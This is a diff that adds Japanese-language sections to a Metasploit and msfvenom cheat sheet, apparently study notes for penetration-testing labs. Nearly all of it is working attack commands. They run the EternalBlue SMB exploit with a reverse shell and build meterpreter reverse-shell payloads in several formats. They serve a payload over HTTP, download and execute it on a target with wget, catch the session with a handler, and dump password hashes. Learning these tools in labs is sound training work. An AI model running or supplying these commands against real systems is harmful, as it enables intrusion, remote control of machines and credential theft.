@@ -752,3 +752,82 @@ services -S netbios
 # HTTP, FTP, SMB, SSH, RDP を検索するのがおすすめ
 ```
 
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS [target IP]
+show payloads
+set payload 2 # payload/generic/shell_reverse_tcp
+exploit
+shell
+
+# Ctrl+zでバックグラウンド実行
+# Ctrl+cでキャンセル
+```
+
+### Msfvenom
+
+```bash
+# ペイロード一覧表示
+msfvenom -l payloads
+```
+
+#### 出力フォーマット
+
+```bash
+# 出力フォーマット一覧表示
+msfvenom --list formats
+```
+
+#### Encoders（ペイロードをエンコードする）
+
+```bash
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[ローカルIP] -f raw -e php/base64
+```
+
+#### Handlers
+
+```bash
+# PHPシェル生成
+msfvenom -p php/reverse_php LHOST=[ローカルIP] LPORT=7777 -f raw > reverse_shell.php
+
+# マルチハンドラー
+use exploit/multi/handler
+```
+
+#### その他のペイロード
+
+```bash
+# Linux Executable and Linkable Format（elf）
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+# Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+# PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+# ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+# Python
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+```
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ローカルIP] LPORT=8765 -f elf > rev_shellx86.elf
+
+# ローカルPCで起動
+python -m http.server 9000
+# ターゲットPCで取得
+wget http://[ローカルIP]:9000/rev_shellx86.elf
+chmod +x rev_shellx86.elf
+./rev_shellx86.elf
+
+# ローカル
+msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+run
+set LHOST [ローカルIP]
+set LPORT 8765
+# ターゲットへ接続
+run
+# ハッシュダンプ取得
+run post/linux/gather/hashdump
+```
